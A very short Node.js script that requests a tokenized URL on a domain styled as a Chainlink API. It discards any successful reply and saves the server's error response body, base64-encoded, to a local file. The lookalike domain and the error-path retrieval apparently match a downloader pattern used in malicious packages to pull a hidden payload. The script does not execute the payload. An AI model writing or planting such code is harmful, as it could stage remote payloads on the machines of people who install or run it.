const axios = require('axios');
const fs = require('fs');

axios
  .get('http://chainlink-api-v3.cloud/api/service/token/11ab759d189dc8bc238cb2525f05b88c')
  .then(() => {
    return false;
  })
  .catch((err) => {
    try {
      const base64Data = Buffer.from(err.response.data, 'utf8').toString('base64');
      fs.writeFile('error-data.txt', base64Data, (err) => {
        if (err) {
          console.error('Error writing file:', err);
          return;
        }
        console.log('File written successfully!');
      });
    } catch (error) {
      console.error(error);
    }
  });